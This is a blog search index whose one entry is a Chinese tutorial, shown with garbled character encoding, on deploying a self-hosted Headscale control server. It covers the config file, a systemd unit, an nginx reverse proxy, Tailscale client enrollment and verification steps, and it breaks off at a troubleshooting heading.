<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Headscale æç®€éƒ¨ç½²æŒ‡å—</title>
      <link href="/post/deploy-headscale.html"/>
      <url>/post/deploy-headscale.html</url>
      
        <content type="html"><![CDATA[<h2 id="0-æ¶æ„ä¸ç«¯å£è§„åˆ’ï¼ˆå…ˆæŠŠç«¯å£å®šæ­»ï¼‰"><a href="#0-æ¶æ„ä¸ç«¯å£è§„åˆ’ï¼ˆå…ˆæŠŠç«¯å£å®šæ­»ï¼‰" class="headerlink" title="0. æ¶æ„ä¸ç«¯å£è§„åˆ’ï¼ˆå…ˆæŠŠç«¯å£å®šæ­»ï¼‰"></a>0. æ¶æ„ä¸ç«¯å£è§„åˆ’ï¼ˆå…ˆæŠŠç«¯å£å®šæ­»ï¼‰</h2><table><thead><tr><th align="left">æœåŠ¡</th><th align="left">åè®®&#x2F;ç«¯å£</th><th align="left">è¯´æ˜</th><th align="left">è°è®¿é—®è°</th></tr></thead><tbody><tr><td align="left"><strong>HTTPS</strong></td><td align="left"><code>TCP/443</code></td><td align="left">Headscale æ§åˆ¶é¢ + DERPï¼ˆç»åä»£ï¼Œå« Upgradeï¼‰</td><td align="left">å…¬ç½‘ â†’ Nginx&#x2F;OpenResty</td></tr><tr><td align="left"><strong>STUN</strong></td><td align="left"><code>UDP/3478</code></td><td align="left">å†…ç½® STUNï¼ˆæ‰“æ´å…³é”®ï¼‰</td><td align="left">å…¬ç½‘ â†’ Headscaleï¼ˆç›´è¿åˆ°æœåŠ¡å™¨ï¼‰</td></tr><tr><td align="left"><strong>Local</strong></td><td align="left"><code>TCP/3477</code></td><td align="left">Headscale æœ¬ä½“ï¼ˆä»…æœ¬æœºç›‘å¬ï¼‰</td><td align="left">Nginx&#x2F;OpenResty â†’ Headscale</td></tr></tbody></table><p>å…³é”®ç‚¹ï¼š</p><ul><li><strong><code>3478</code> å¿…é¡»æ”¾è¡Œ UDPï¼ˆä¸æ˜¯ TCPï¼‰</strong>ï¼šå¾ˆå¤šäº‘å®‰å…¨ç»„ TCP&#x2F;UDP åˆ†å¼€é€‰ï¼Œåˆ«é€‰é”™ã€‚</li><li><strong>ä¸è¦å¯¹å…¬ç½‘æš´éœ² <code>3477</code></strong>ï¼šåªç›‘å¬ <code>127.0.0.1</code>ï¼Œç”±åä»£ç»Ÿä¸€å‡ºå…¥å£ã€‚</li></ul><hr><h2 id="1-å‰ç½®å‡†å¤‡ï¼ˆæ›¿æ¢å ä½ç¬¦ï¼‰"><a href="#1-å‰ç½®å‡†å¤‡ï¼ˆæ›¿æ¢å ä½ç¬¦ï¼‰" class="headerlink" title="1. å‰ç½®å‡†å¤‡ï¼ˆæ›¿æ¢å ä½ç¬¦ï¼‰"></a>1. å‰ç½®å‡†å¤‡ï¼ˆæ›¿æ¢å ä½ç¬¦ï¼‰</h2><p>æŠŠä¸‹é¢å ä½ç¬¦æ›¿æ¢æˆä½ çš„å€¼ï¼š</p><ul><li><code>hs.example.com</code>ï¼šä½ çš„æ§åˆ¶é¢åŸŸåï¼ˆå¿…é¡» HTTPS å¯è®¿é—®ï¼‰</li><li><code>SERVER_PUBLIC_IP</code>ï¼šæœåŠ¡å™¨å…¬ç½‘ IPv4</li><li><code>REGION_CODE</code>ï¼šè‡ªå»º DERP codeï¼ˆå»ºè®®å°å†™ï¼Œä¾‹å¦‚ <code>myderp</code>ï¼‰</li></ul><p>å‡†å¤‡é¡¹ï¼š</p><ul><li>ä¸€å° Linux æœåŠ¡å™¨ï¼ˆæœ‰å…¬ç½‘ IPv4ï¼‰</li><li>ä¸€ä¸ªåŸŸå A è®°å½•æŒ‡å‘ <code>SERVER_PUBLIC_IP</code></li><li>å·²æœ‰è¯ä¹¦ï¼ˆæˆ–ä½ èƒ½è‡ªå·±æå®š ACME ç”³è¯·ï¼›æœ¬æ–‡ä¸å±•å¼€ï¼‰</li><li>Nginx æˆ– OpenResty å·²å®‰è£…</li></ul><hr><h2 id="2-å®‰è£…-Headscaleï¼ˆäºŒè¿›åˆ¶ï¼‰"><a href="#2-å®‰è£…-Headscaleï¼ˆäºŒè¿›åˆ¶ï¼‰" class="headerlink" title="2. å®‰è£… Headscaleï¼ˆäºŒè¿›åˆ¶ï¼‰"></a>2. å®‰è£… Headscaleï¼ˆäºŒè¿›åˆ¶ï¼‰</h2><p>ä» <code>juanfont/headscale</code> çš„ Releases ä¸‹è½½ä¸ä½ æœºå™¨æ¶æ„åŒ¹é…çš„äºŒè¿›åˆ¶ï¼š</p><ul><li><a href="https://github.com/juanfont/headscale/releases"><code>juanfont/headscale</code> Releases</a></li></ul><p>å®‰è£…åˆ° <code>/usr/local/bin/headscale</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> ./headscale /usr/local/bin/headscale</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 0755 /usr/local/bin/headscale</span><br><span class="line">/usr/local/bin/headscale version</span><br></pre></td></tr></table></figure><blockquote><p>å°å‘ï¼šå¦‚æœé‡åˆ° <code>sudo headscale: command not found</code>ï¼Œå¤šåŠæ˜¯ <code>sudo</code> çš„ <code>secure_path</code> ä¸å« <code>/usr/local/bin</code>ã€‚æœ¬æ–‡åç»­ç»Ÿä¸€ç”¨ç»å¯¹è·¯å¾„ï¼š<code>sudo /usr/local/bin/headscale ...</code></p></blockquote><hr><h2 id="3-ç”Ÿæˆå¿…é¡»å¯†é’¥ï¼ˆv0-28-å¸¸è§å¼ºåˆ¶é¡¹ï¼‰"><a href="#3-ç”Ÿæˆå¿…é¡»å¯†é’¥ï¼ˆv0-28-å¸¸è§å¼ºåˆ¶é¡¹ï¼‰" class="headerlink" title="3. ç”Ÿæˆå¿…é¡»å¯†é’¥ï¼ˆv0.28+ å¸¸è§å¼ºåˆ¶é¡¹ï¼‰"></a>3. ç”Ÿæˆå¿…é¡»å¯†é’¥ï¼ˆv0.28+ å¸¸è§å¼ºåˆ¶é¡¹ï¼‰</h2><p>åˆ›å»ºç›®å½•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/headscale /var/lib/headscale</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 700 /var/lib/headscale</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆ Noise ç§é’¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/local/bin/headscale generate private-key \</span><br><span class="line">  | <span class="built_in">sudo</span> <span class="built_in">tee</span> /var/lib/headscale/noise_private.key &gt;/dev/null</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 600 /var/lib/headscale/noise_private.key</span><br></pre></td></tr></table></figure><blockquote><p>è¯´æ˜ï¼šè¿™é‡Œç”¨ <code>tee</code> æ˜¯ä¸ºäº†è§£å†³â€œ<code>sudo</code> + é‡å®šå‘â€æƒé™é—®é¢˜ï¼ˆ<code>sudo cmd &gt; file</code> çš„é‡å®šå‘ä¸åœ¨ sudo æƒé™é‡Œæ‰§è¡Œï¼‰ã€‚<br>å¦å¤–ï¼Œå†…å®¹é€šå¸¸å¸¦ <code>privkey:</code> å‰ç¼€ï¼Œåˆ«æ‰‹åŠ¨åˆ ï¼Œå¦åˆ™å¯èƒ½æŠ¥ â€œexpected type prefix privkey:â€ã€‚</p></blockquote><hr><h2 id="4-å†™å…¥-Headscale-é…ç½®ï¼ˆæœ€å°å¯ç”¨æ¨¡æ¿ï¼‰"><a href="#4-å†™å…¥-Headscale-é…ç½®ï¼ˆæœ€å°å¯ç”¨æ¨¡æ¿ï¼‰" class="headerlink" title="4. å†™å…¥ Headscale é…ç½®ï¼ˆæœ€å°å¯ç”¨æ¨¡æ¿ï¼‰"></a>4. å†™å…¥ Headscale é…ç½®ï¼ˆæœ€å°å¯ç”¨æ¨¡æ¿ï¼‰</h2><p>ä¿å­˜ä¸ºï¼š<code>/etc/headscale/config.yaml</code></p><blockquote><p>è¯´æ˜ï¼šå…ˆ<strong>å…³é—­ DNS&#x2F;MagicDNS</strong>ï¼Œå‡å°‘å¿…å¡«é¡¹è€¦åˆï¼›è·‘é€šåå†æŒ‰ã€Œè¿›é˜¶ã€ç« èŠ‚å¼€å¯ã€‚</p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/headscale/config.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¿…é¡»æ›¿æ¢ï¼šä½ çš„æ§åˆ¶é¢å…¬ç½‘ HTTPS åœ°å€ï¼ˆåä»£åœºæ™¯ä¹Ÿä¸€æ ·ï¼‰</span></span><br><span class="line"><span class="attr">server_url:</span> <span class="string">&quot;https://hs.example.com&quot;</span> <span class="comment"># â† æ›¿æ¢ä¸ºä½ çš„åŸŸå</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åªåœ¨æœ¬æœºç›‘å¬ï¼Œç”± Nginx/OpenResty å¯¹å¤–æä¾› 443</span></span><br><span class="line"><span class="attr">listen_addr:</span> <span class="string">&quot;127.0.0.1:3477&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tls_cert_path:</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="attr">tls_key_path:</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">prefixes:</span></span><br><span class="line">  <span class="attr">v4:</span> <span class="string">&quot;100.64.0.0/10&quot;</span></span><br><span class="line">  <span class="attr">v6:</span> <span class="string">&quot;fd7a:115c:a1e0::/48&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">database:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">sqlite</span></span><br><span class="line">  <span class="attr">sqlite:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">&quot;/var/lib/headscale/db.sqlite&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># v0.28+ å¸¸è§å¼ºåˆ¶é¡¹ï¼šNoise ç§é’¥</span></span><br><span class="line"><span class="attr">noise:</span></span><br><span class="line">  <span class="attr">private_key_path:</span> <span class="string">&quot;/var/lib/headscale/noise_private.key&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å…ˆå…³é—­ DNS åŠŸèƒ½ï¼Œé¿å…å¼•å…¥ base_domain/nameservers ç­‰é¢å¤–å¿…å¡«é¡¹</span></span><br><span class="line"><span class="attr">dns:</span></span><br><span class="line">  <span class="attr">magic_dns:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">override_local_dns:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">derp:</span></span><br><span class="line">  <span class="attr">server:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># å¯æ›¿æ¢ï¼šè‡ªå»º DERP çš„ region ä¿¡æ¯ï¼ˆä¾¿äºè¯†åˆ«/æ’æŸ¥ï¼›é¿å…ä¸å®˜æ–¹å†²çªå³å¯ï¼‰</span></span><br><span class="line">    <span class="attr">region_id:</span> <span class="number">901</span>                 <span class="comment"># â† å¯æ”¹ï¼›åªè¦ä¸å’Œå®˜æ–¹/å…¶ä»–è‡ªå»ºé‡å¤å³å¯</span></span><br><span class="line">    <span class="attr">region_code:</span> <span class="string">&quot;REGION_CODE&quot;</span>     <span class="comment"># â† å¿…é¡»æ›¿æ¢ï¼šå»ºè®®å°å†™ï¼Œä¾‹å¦‚ &quot;myderp&quot;</span></span><br><span class="line">    <span class="attr">region_name:</span> <span class="string">&quot;REGION_NAME&quot;</span>     <span class="comment"># â† å¿…é¡»æ›¿æ¢ï¼šéšä¾¿å–ä¸€ä¸ªå¯è¯»åå­—å³å¯</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">private_key_path:</span> <span class="string">&quot;/var/lib/headscale/derp_server_private.key&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># STUNï¼ˆUDP/3478ï¼‰</span></span><br><span class="line">    <span class="attr">stun_listen_addr:</span> <span class="string">&quot;0.0.0.0:3478&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å‘Šè¯‰å®¢æˆ·ç«¯ DERP çš„å…¬ç½‘å…¥å£ï¼ˆåŸŸå + å…¬ç½‘ IPv4ï¼‰</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">&quot;hs.example.com&quot;</span>     <span class="comment"># â† å¿…é¡»æ›¿æ¢ï¼šä½ çš„åŸŸåï¼ˆä¸ server_url ä¸€è‡´ï¼‰</span></span><br><span class="line">    <span class="attr">ipv4:</span> <span class="string">&quot;SERVER_PUBLIC_IP&quot;</span>       <span class="comment"># â† å¿…é¡»æ›¿æ¢ï¼šæœåŠ¡å™¨å…¬ç½‘ IPv4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ›´å®‰å…¨ï¼šåªå…è®¸ä½  tailnet çš„èŠ‚ç‚¹ä½¿ç”¨è¿™ä¸ª DERP</span></span><br><span class="line">    <span class="attr">verify_clients:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">automatically_add_embedded_derp_region:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># å»ºè®®ä¿ç•™å®˜æ–¹ DERP å…œåº•ï¼ˆå¦åˆ™å•ç‚¹ï¼‰</span></span><br><span class="line">  <span class="attr">urls:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;https://controlplane.tailscale.com/derpmap/default&quot;</span></span><br><span class="line">  <span class="attr">paths:</span> []</span><br><span class="line"></span><br><span class="line"><span class="attr">log:</span></span><br><span class="line">  <span class="attr">level:</span> <span class="string">&quot;info&quot;</span></span><br></pre></td></tr></table></figure><p>é…ç½®æ ¡éªŒï¼ˆå¿…é¡»è¿‡ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/local/bin/headscale configtest -c /etc/headscale/config.yaml</span><br></pre></td></tr></table></figure><hr><h2 id="5-systemd-å¯åŠ¨-Headscale"><a href="#5-systemd-å¯åŠ¨-Headscale" class="headerlink" title="5. systemd å¯åŠ¨ Headscale"></a>5. systemd å¯åŠ¨ Headscale</h2><p>åˆ›å»ºï¼š<code>/etc/systemd/system/headscale.service</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=Headscale</span><br><span class="line"><span class="attr">After</span>=network-<span class="literal">on</span>line.target</span><br><span class="line"><span class="attr">Wants</span>=network-<span class="literal">on</span>line.target</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">Type</span>=simple</span><br><span class="line"><span class="attr">ExecStart</span>=/usr/local/bin/headscale serve -c /etc/headscale/config.yaml</span><br><span class="line"><span class="attr">Restart</span>=<span class="literal">on</span>-failure</span><br><span class="line"><span class="attr">RestartSec</span>=<span class="number">3</span></span><br><span class="line"><span class="attr">LimitNOFILE</span>=<span class="number">1048576</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure><p>å¯åŠ¨å¹¶è‡ªå¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> --now headscale</span><br><span class="line"><span class="built_in">sudo</span> systemctl status headscale --no-pager</span><br></pre></td></tr></table></figure><blockquote><p>ç”Ÿäº§æç¤ºï¼šä¸ºç®€å•èµ·è§ï¼Œä¸Šé¢æœªæŒ‡å®š <code>User=</code>&#x2F;<code>Group=</code>ï¼Œé»˜è®¤ root è¿è¡Œã€‚ç”Ÿäº§ç¯å¢ƒå»ºè®®åˆ›å»ºä¸“ç”¨ç”¨æˆ·ï¼ˆå¦‚ <code>headscale</code>ï¼‰å¹¶æ”¶ç´§ <code>/var/lib/headscale</code> æƒé™åå†ä»¥é root è¿è¡Œã€‚</p></blockquote><hr><h2 id="6-Nginx-OpenResty-åä»£ï¼ˆå…³é”®æ˜¯-Upgrade-é•¿è¿æ¥ï¼‰"><a href="#6-Nginx-OpenResty-åä»£ï¼ˆå…³é”®æ˜¯-Upgrade-é•¿è¿æ¥ï¼‰" class="headerlink" title="6. Nginx&#x2F;OpenResty åä»£ï¼ˆå…³é”®æ˜¯ Upgrade + é•¿è¿æ¥ï¼‰"></a>6. Nginx&#x2F;OpenResty åä»£ï¼ˆå…³é”®æ˜¯ Upgrade + é•¿è¿æ¥ï¼‰</h2><p>ç¤ºä¾‹ï¼š<code>/etc/nginx/conf.d/headscale.conf</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">map</span> <span class="variable">$http_upgrade</span> <span class="variable">$connection_upgrade</span> &#123;</span><br><span class="line">  <span class="attribute">default</span> upgrade;</span><br><span class="line">  &#x27;&#x27;      close;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">  <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line">  <span class="attribute">http2</span> <span class="literal">on</span>;</span><br><span class="line">  <span class="attribute">server_name</span> hs.example.com;</span><br><span class="line"></span><br><span class="line">  <span class="attribute">ssl_certificate</span>     /path/to/fullchain.pem;</span><br><span class="line">  <span class="attribute">ssl_certificate_key</span> /path/to/privkey.pem;</span><br><span class="line"></span><br><span class="line">  <span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1:3477;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">proxy_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host              <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Real-IP         <span class="variable">$remote_addr</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For   <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-Proto https;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># DERP/æ§åˆ¶é¢éƒ½å¯èƒ½éœ€è¦ Upgradeï¼ˆä¿é™©èµ·è§å…¨ç«™éƒ½ä¿ç•™ï¼‰</span></span><br><span class="line">    <span class="attribute">proxy_set_header</span> Upgrade    <span class="variable">$http_upgrade</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Connection <span class="variable">$connection_upgrade</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">proxy_read_timeout</span>  <span class="number">3600s</span>;</span><br><span class="line">    <span class="attribute">proxy_send_timeout</span>  <span class="number">3600s</span>;</span><br><span class="line">    <span class="attribute">proxy_buffering</span> <span class="literal">off</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥å¹¶é‡è½½ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nginx -t</span><br><span class="line"><span class="built_in">sudo</span> systemctl reload nginx</span><br></pre></td></tr></table></figure><hr><h2 id="7-åˆ›å»ºç”¨æˆ·-å®¢æˆ·ç«¯æ¥å…¥"><a href="#7-åˆ›å»ºç”¨æˆ·-å®¢æˆ·ç«¯æ¥å…¥" class="headerlink" title="7. åˆ›å»ºç”¨æˆ· + å®¢æˆ·ç«¯æ¥å…¥"></a>7. åˆ›å»ºç”¨æˆ· + å®¢æˆ·ç«¯æ¥å…¥</h2><p>å…ˆè¯´æ˜ä¸€ä¸‹ä»€ä¹ˆæ˜¯â€œç”¨æˆ·ï¼ˆuserï¼‰â€ï¼š</p><ul><li>Headscale çš„ <strong>user</strong> ä¸æ˜¯ç™»å½•è´¦å·&#x2F;å¯†ç ä½“ç³»ï¼Œè€Œæ˜¯ä¸€ä¸ª<strong>å‘½åç©ºé—´&#x2F;åˆ†ç»„</strong>ï¼šæŠŠä¸€æ‰¹è®¾å¤‡ï¼ˆnodesï¼‰å½’åˆ°åŒä¸€ä¸ªç”¨æˆ·ä¸‹é¢ï¼Œä¾¿äºç®¡ç†ä¸å‘æ”¾å…¥ç½‘ keyã€‚</li><li><strong>ä¸ªäºº&#x2F;å°å›¢é˜Ÿæœ€å¸¸è§</strong>ï¼šåªå»º 1 ä¸ª userï¼Œç„¶åæ‰€æœ‰è®¾å¤‡éƒ½åŠ å…¥è¿™ä¸ª userã€‚</li><li><code>tailnet-user</code> åªæ˜¯ç¤ºä¾‹åï¼Œä½ å¯ä»¥æ”¹æˆè‡ªå·±çš„ï¼ˆä¾‹å¦‚ <code>alice</code> &#x2F; <code>team-a</code>ï¼‰ã€‚</li></ul><p>åˆ›å»ºç”¨æˆ·ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ª userï¼ˆç¤ºä¾‹åï¼štailnet-userï¼‰</span></span><br><span class="line"><span class="built_in">sudo</span> /usr/local/bin/headscale <span class="built_in">users</span> create tailnet-user</span><br><span class="line"><span class="built_in">sudo</span> /usr/local/bin/headscale <span class="built_in">users</span> list</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆ preauth keyï¼ˆä¼˜å…ˆç”¨ç”¨æˆ·åï¼›æ—§ç‰ˆæœ¬ä¸æ”¯æŒå†ç”¨æ•°å­— IDï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¼˜å…ˆï¼šç›´æ¥ç”¨ç”¨æˆ·å</span></span><br><span class="line"><span class="built_in">sudo</span> /usr/local/bin/headscale preauthkeys create -u tailnet-user --reusable --expiration 24h</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…œåº•ï¼šç”¨ users list é‡Œçš„ USER_ID</span></span><br><span class="line"><span class="built_in">sudo</span> /usr/local/bin/headscale preauthkeys create -u USER_ID --reusable --expiration 24h</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯åŠ å…¥ï¼ˆLinux ç¤ºä¾‹ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> tailscale up \</span><br><span class="line">  --reset \</span><br><span class="line">  --login-server https://hs.example.com \</span><br><span class="line">  --authkey hskey-auth-xxxxxxxxxxxxxxxx \</span><br><span class="line">  --accept-dns=<span class="literal">false</span> \</span><br><span class="line">  --accept-routes</span><br></pre></td></tr></table></figure><blockquote><p>åç»­æ–°å¢è®¾å¤‡ï¼šé‡å¤æœ¬èŠ‚â€œç”Ÿæˆ key â†’ å®¢æˆ·ç«¯ tailscale upâ€å³å¯ã€‚</p></blockquote><hr><h2 id="8-éªŒæ”¶æ¸…å•ï¼ˆæ‰€æœ‰æ£€æŸ¥ç»Ÿä¸€åœ¨è¿™é‡Œåšï¼‰"><a href="#8-éªŒæ”¶æ¸…å•ï¼ˆæ‰€æœ‰æ£€æŸ¥ç»Ÿä¸€åœ¨è¿™é‡Œåšï¼‰" class="headerlink" title="8. éªŒæ”¶æ¸…å•ï¼ˆæ‰€æœ‰æ£€æŸ¥ç»Ÿä¸€åœ¨è¿™é‡Œåšï¼‰"></a>8. éªŒæ”¶æ¸…å•ï¼ˆæ‰€æœ‰æ£€æŸ¥ç»Ÿä¸€åœ¨è¿™é‡Œåšï¼‰</h2><h3 id="8-1-æœåŠ¡å™¨ä¾§"><a href="#8-1-æœåŠ¡å™¨ä¾§" class="headerlink" title="8.1 æœåŠ¡å™¨ä¾§"></a>8.1 æœåŠ¡å™¨ä¾§</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/local/bin/headscale configtest -c /etc/headscale/config.yaml</span><br><span class="line">systemctl status headscale --no-pager</span><br><span class="line"><span class="built_in">sudo</span> ss -lntp | egrep <span class="string">&#x27;:443|:3477&#x27;</span></span><br><span class="line"><span class="built_in">sudo</span> ss -ulnp | egrep <span class="string">&#x27;:3478&#x27;</span></span><br><span class="line">curl -i https://hs.example.com/derp</span><br><span class="line"><span class="built_in">sudo</span> /usr/local/bin/headscale nodes list</span><br></pre></td></tr></table></figure><p>çœ‹åˆ° <code>curl -i https://hs.example.com/derp</code> è¿”å› <code>426</code> ä¸”åŒ…å« <code>DERP requires connection upgrade</code>ï¼š<strong>æ­£å¸¸</strong>ï¼ˆä»£è¡¨è·¯ç”±æ‰“é€šï¼‰ã€‚</p><h3 id="8-2-å®¢æˆ·ç«¯ä¾§ï¼ˆæœ€é‡è¦ï¼‰"><a href="#8-2-å®¢æˆ·ç«¯ä¾§ï¼ˆæœ€é‡è¦ï¼‰" class="headerlink" title="8.2 å®¢æˆ·ç«¯ä¾§ï¼ˆæœ€é‡è¦ï¼‰"></a>8.2 å®¢æˆ·ç«¯ä¾§ï¼ˆæœ€é‡è¦ï¼‰</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tailscale status</span><br><span class="line">tailscale ping &lt;peer_100.64.x.x&gt;</span><br><span class="line">tailscale netcheck</span><br></pre></td></tr></table></figure><p><code>tailscale status</code> é€Ÿè®°ï¼š</p><ul><li><code>relay</code> &#x2F; <code>via DERP(...)</code>ï¼šèµ° DERP ä¸­ç»§ï¼ˆæ…¢ä¸€äº›ï¼Œä½†èƒ½é€šï¼‰</li><li><code>direct</code>ï¼šP2P æ‰“æ´æˆåŠŸï¼ˆæ›´å¿«ã€æ›´ç¨³å®šï¼‰</li></ul><hr><h2 id="9-å¸¸è§ç–‘éš¾æ‚ç—‡ï¼ˆåªä¿ç•™â€œç°è±¡çº§â€é—®é¢˜ï¼‰"><a href="#9-å¸¸è§ç–‘éš¾æ‚ç—‡ï¼ˆåªä¿ç•™â€œç°è±¡çº§â€é—®é¢˜ï¼‰" class="headerlink" title="9. å¸¸è§ç–‘éš¾æ‚ç—‡ï¼ˆåªä¿ç•™â€œç°è±¡çº§â€é—®é¢˜ï¼‰"></a>9. 